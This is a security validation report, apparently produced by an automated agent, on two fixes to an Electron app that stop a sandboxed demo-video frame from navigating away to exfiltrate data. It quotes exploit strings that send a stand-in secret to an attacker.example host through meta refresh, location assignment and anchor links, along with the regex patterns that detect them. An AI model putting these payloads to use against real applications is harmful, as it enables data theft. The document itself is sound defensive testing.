# Validation — navigation-exfiltration repair (meta-refresh Critical from validate-repair-wave.md)

Base: `2efa9e34` (per this PRD's implementation notes). Two repair commits land
(`git log --oneline 2efa9e34..HEAD`):

```
63a23440 fix(projectHomeAdminRoutes): reject demo-video self-navigation in NETWORK_CHECKS   (1480)
1f6e5c99 fix(smfile): block demo-video subframe navigation outside smfile://                (1479)
```

Combined diff (`git diff --stat 2efa9e34..HEAD` over the two PRDs' own files): 5 files,
+179/-3 — `src/main/lib/smfileHeaders.cjs`, `src/main/lib/__tests__/smfileHeaders.test.cjs`,
`src/main/index.cjs`, `src/main/lib/projectHomeAdminRoutes.cjs`,
`src/main/__tests__/projectHomeAdminRoutes.test.cjs`. No files outside each PRD's declared
`# Files` section changed.

`node_modules` was symlinked in from the main checkout (`/home/bilko/Projects/session-manager/node_modules`)
since this job worktree doesn't carry it — same pattern noted in `validate-repair-wave.md`.

## repair-demo-video-frame-navigation (1479) — VERIFIED

- `src/main/lib/smfileHeaders.cjs:41-62` exports `shouldBlockFrameNavigation({ isMainFrame,
  currentUrl, targetUrl })`. Read in full: returns `false` for `isMainFrame`; `false` if
  `currentUrl` isn't a string starting with `smfile:`; decodes the pathname (normalising `\`
  to `/`, mirroring `smfileResponseHeaders`) and returns `false` if it doesn't contain
  `/session-manager-operations/project-pages/demo-video/`; `false` if `targetUrl` starts with
  `smfile:`, or is exactly `about:blank`/`about:srcdoc`; `true` otherwise — which covers "any
  other `about:` target" per the AC, since nothing but those two literals short-circuits before
  the final `return true`.
- `src/main/index.cjs:463-472` registers `mainWindow.webContents.on('will-frame-navigate', ...)`,
  calling `shouldBlockFrameNavigation` with `details.frame?.url`/`details.isMainFrame`/`details.url`,
  `details.preventDefault()` + one `console.warn` on block. No other line in the handler changed
  (confirmed via `git diff` — the only other change in `index.cjs` is this 10-line block).
- `src/main/lib/__tests__/smfileHeaders.test.cjs` — 7 new tests cover every AC case plus two
  extras (Windows-style backslash path, `about:config` as a non-blank/srcdoc `about:` target).
- Gate (`timeout 300 npx vitest run src/main/lib/__tests__/smfileHeaders.test.cjs`): **14/14
  passed** (6 pre-existing `smfileResponseHeaders` tests + 8 new `shouldBlockFrameNavigation` tests).
- **Live re-exploitation** (`node -e` requiring `smfileHeaders.cjs` directly): called
  `shouldBlockFrameNavigation` with a demo-video `currentUrl` and `targetUrl:
  'https://attacker.example/exfil?data=secret'` (the effective target of a meta-refresh or
  `location.href` assignment) → returns `true` (blocked). Same `currentUrl` with
  `targetUrl: 'smfile://host/other.html'` → `false` (allowed, no regression). Main-frame
  navigation to the same hostile target → `false` (untouched, confirming the guard is scoped to
  subframes only, not a change in top-level navigation behaviour). Editor-preview smfile path
  (non demo-video) → `false` (editor previews unaffected). `about:config` → `true`;
  `about:blank` → `false` — matches AC exactly.

## repair-demo-video-refresh-checks (1480) — VERIFIED; meta-refresh exploit re-run against landed code

- `src/main/lib/projectHomeAdminRoutes.cjs:66-70` — `NETWORK_CHECKS` gained exactly the 5
  patterns the AC lists: `http-equiv\s*=\s*["']?refresh`, the `location.(href|assign|replace)`/`location\s*=` pattern,
  `document\.location`, `\b(?:top|parent)\.`, and the `<a href="http(s):|//|javascript:…">` pattern.
  Confirmed byte-for-byte via `git diff` against the AC's regex text.
- `src/main/__tests__/projectHomeAdminRoutes.test.cjs` adds one rejection test per new check plus
  the existing legitimate `requestAnimationFrame`/canvas demo-document test (unchanged, still
  accepted).
- Gate (`timeout 300 npx vitest run src/main/__tests__/projectHomeAdminRoutes.test.cjs`): **61/61
  passed.**
- **Live re-exploitation** (`node -e` requiring `projectHomeAdminRoutes.cjs` directly, not just the
  test suite) — re-ran the exact meta-refresh exploit from `validate-repair-wave.md`'s Critical
  finding:
  - `<meta http-equiv="refresh" content="0;url=https://attacker.example/exfil?data=secret">` inside
    an otherwise-legitimate demo document → `validateDemoVideoHtml` now returns `"html must not be
    network-capable: meta refresh is not allowed"` instead of `null`. **Exploit no longer works.**
  - Companion navigation vectors also probed and rejected: `location.href = "https://attacker…"`
    (caught by the `location.href/assign/replace/=` pattern), `top.location = "https://attacker…"`
    (caught — matches the `location\s*=` pattern before the `top.` pattern even runs), and
    `<a href="https://attacker.example/exfil">` (caught by the `<a href=...>` pattern; this one
    actually matches the pre-existing bare `src=/href=` check first, since that check is listed
    earlier in `NETWORK_CHECKS` and both match — not a problem, just means the AC's new anchor
    pattern is currently unreachable dead weight for `http(s):`/`//` hrefs specifically; see Minor
    finding below).
  - False-positive guard: a document containing `const allocation = 5; if (typeof location ===
    "object") {}` plus the legitimate canvas/`requestAnimationFrame` body still returns `null`
    (accepted) — the `\b` word boundaries do not misfire on `allocation` or `location ===`
    comparisons, per the PRD's own implementation note.
  - The legitimate demo document (canvas + `requestAnimationFrame`, no network/navigation surface)
    still returns `null`. No regression.

## Plan-level checks

- `npm run typecheck` (`tsc --noEmit` x2): clean.
- `npm run lint` (`selectors`, `hooks`, `docs`, `paths`, `any`, `main-ts-check`, `filenames`,
  `renderer-storage`): all 8 sub-checks OK.

## Security review (scoped to the plan's own diff)

Both commits are narrowly additive: five new regex literals appended to an existing allow-list
array, and one new `webContents` event listener that calls `event.preventDefault()` based on a
pure boolean function of two URL strings already supplied by Electron itself (`details.frame.url`,
`details.url`) — no new external input parsing, no new IPC route, no new file-write surface, no
subprocess, no secret or credential handling. `shouldBlockFrameNavigation`'s `new URL(currentUrl)`
call is wrapped in try/catch and fails closed (returns `false`, i.e. does not block) on a malformed
URL — this is intentionally permissive on parse failure since `currentUrl` originates from
Electron's own frame tracking, not attacker-controlled input; there is no scenario where an
attacker controls `currentUrl` without already controlling the demo-video document, which is
already sandboxed to `smfile://.../demo-video/...`. No regression against the three PRDs validated
in `validate-repair-wave.md` — their files are untouched by this diff (confirmed via `git diff --stat`
scoped to those PRDs' files, below).

```
$ git diff --stat 2efa9e34..HEAD -- src/renderer/components/ChatTranscriptTurn.tsx src/renderer/components/__tests__/ChatTranscriptTurn.streaming.test.tsx
(empty — no changes)
```

## Findings

**Minor — the new `<a href="http(s):|//|javascript:…">` check (`projectHomeAdminRoutes.cjs:70`)
is shadowed by the pre-existing bare `src=/href=` check (`:56`) for `http(s):`/`//` targets.**
Both patterns match the same `<a href="https://...">` string, and `NETWORK_CHECKS` is scanned in
order (`:96` `for (const { re, message } of NETWORK_CHECKS)`), so the pre-existing, more generic
check at `:56` fires first and the new, more specific anchor message at `:70` is only reachable for
a `javascript:` href (since `:56`'s regex doesn't match that scheme). Not a security gap — the
exploit is still rejected — but the new pattern's own rejection message ('`<a href="http(s):|//|
javascript:…"> is not allowed`') is effectively dead code for two of its three documented schemes.
Cosmetic; no fix needed for this validation.

**No Critical or Important findings.** The navigation-exfiltration Critical from
`validate-repair-wave.md` (meta-refresh/`location.href` self-navigation of the demo-video subframe)
is closed at both layers it was reported to evade: the write-time content validator now rejects the
exploit string outright, and the runtime `will-frame-navigate` guard independently blocks the
resulting cross-origin navigation even if a future obfuscated variant slipped past the regex layer
(mirroring how PRD 1475's CSP response header already backstopped the `fetch`/`XHR` bypass found in
the same wave).

## Sentinel

VALIDATION: repair-demo-video-frame-navigation VERIFIED
VALIDATION: repair-demo-video-refresh-checks VERIFIED
SCHEDULER_VERDICT: PASS
